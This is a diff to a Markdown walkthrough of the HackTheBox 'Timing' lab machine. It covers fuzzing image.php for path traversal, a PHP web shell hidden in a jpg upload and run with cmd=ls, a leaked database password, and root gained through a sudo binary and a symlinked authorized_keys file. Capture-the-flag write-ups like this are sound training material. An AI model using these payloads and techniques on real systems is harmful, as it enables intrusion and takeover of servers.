@@ -7,9 +7,9 @@
 
 2-source code review (php)
 
-2-Unrestricted File Upload
+3-Unrestricted File Upload
 
-3-Symbolic link
+4-Symbolic link
 
 
 
@@ -41,21 +41,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
- let's explore port `80` ,it opened just login page. 
+ let's explore port `80` ,it is login page. 
 
 ![1](https://user-images.githubusercontent.com/36403473/167138043-200b10a8-6468-408b-a3ee-f84dd168432b.png)
 
 ## user flag
 
-i tried `sql injection` but didnt work, so lets explore directories i prefere `dirsearch` tool
-``` try 
+i tried `sql injection` but didn't work, so let's explore directories ,i prefere `dirsearch` tool
+
+```
 [13:38:41] 200 -    0B  - /image.php
 [13:38:48] 200 -    5KB - /login.php
 
 ```
 
 `image.php`
-i used `WFUZZ` to find any paramters and i found `img` parameter.
+
+I use `WFUZZ` to find if there is any parameter and i found `img` parameter.
+
 `wfuzz -w anyworldist -hh 0 http://timing.htb/image.php?FUZZ=../etc/passwd`
 
 #### note :
@@ -71,7 +74,7 @@ Arjun
 
 ![2](https://user-images.githubusercontent.com/36403473/170888075-b55b6abb-5ac3-4d23-802a-5c11560b312d.png)
 
-very good it's seem way to `attack` lets try some injections (Sql injection -LFI-command injection)
+very good it's seem way to `attack` let's try some injections (Sql injection -LFI-command injection)
 
 using `PHP wrappers`
 
@@ -212,12 +215,12 @@ include "footer.php";
 
 ```
 
-i found `db_conn.php` and many pages i get all of them let's start new chapter.
+i found `db_conn.php` and many pages ,i got all of them let's start new chapter.
 
 ![4](https://user-images.githubusercontent.com/36403473/170888997-b67eb05e-d040-4b89-b562-56e37e122212.png)
 
 
-### php code review:
+### code review:
 
 ### login.php:
 
@@ -475,7 +478,7 @@ The generated ID from this function does not guarantee uniqueness of the return 
 so the problem that the new name of photo can be detected.
 
 
-i genetate php code that help me to detect new photo name :
+i generate php code that help me to detect new photo name :
 
 ```
 <?PHP
@@ -539,10 +542,80 @@ function time_Test()
 ```
 so lets upload our shell file and run our script.
 
+we need php code inside `jpg` file 
+
+i generate  `pk.jpg` file and put this php code inside it 
+`<?php system($_GET[cmd]);?> `
+
+`http://timing.htb/image.php?img=images/uploads/e8fd9fafa2388864352241933bcac132_pk.jpg&cmd=ls`
+
+```
+admin_auth_check.php
+auth_check.php
+avatar_uploader.php
+css
+db_conn.php
+footer.php
+header.php
+image.php
+images
+index.php
+js
+login.php
+logout.php
+
+```
+in `/opt` directory i found `source-files-backup.zip`, i downloaded and explore it .
+
+in `db_conn.php`
+```
+<?php
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
+````
+i tried to login with `4_V3Ry_l0000n9_p422w0rd` via `ssh` but it doesn't work,so i should dig more.
+
+i found another password  in git logs folders by using `git log -p` command lets try this password
+if you dont know how to use `git logs ` check this [this](https://git-scm.com/docs/git-log)
+
+![9](https://user-images.githubusercontent.com/36403473/171456400-9eb77534-274a-4510-8f43-3a96f1f7c63f.png)
+
+![10](https://user-images.githubusercontent.com/36403473/171457875-772b477b-2a34-4271-bfdb-b819410a450f.png)
+
+### Root flag
+
+by checking sudo 
+
+```
+Matching Defaults entries for aaron on timing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User aaron may run the following commands on timing:
+    (ALL) NOPASSWD: /usr/bin/netutils
 
 
-### Unrestricted File Upload:
+```
+lets run this binary 
 
+![12](https://user-images.githubusercontent.com/36403473/171492490-f0907132-dc5d-485d-a5a7-a680f7eba024.png)
 
+its a binary you can download file to machine with `root` permissions.
+for trying, i downloaded test python file on the server.
 
+...\Exploit.....
+In fact, I've encountered such an idea before
+
+### Symbolic link:
+is a file-system object that points to another file system object. The object being pointed to is called the target. 
  
+so i will make Symbolic link for ssh key and overwrite authorized_key (Generate SSH Keys use `ssh-keygen` command).
+
+i will use this binary to upload ssh key to server but it should name the same name of symbol linked to overwrite.
+`ln -s source_file symbolic_link
+
+![13](https://user-images.githubusercontent.com/36403473/171502770-4c458c06-e13b-419a-bde4-8807f296f4c2.png)
+![14](https://user-images.githubusercontent.com/36403473/171502771-3ce32a8b-c1c4-49ae-b198-046c512cd978.png)
+i
+![16](https://user-images.githubusercontent.com/36403473/171504297-9310e428-aedd-4925-815e-e9809e218f75.png)
+
+
+
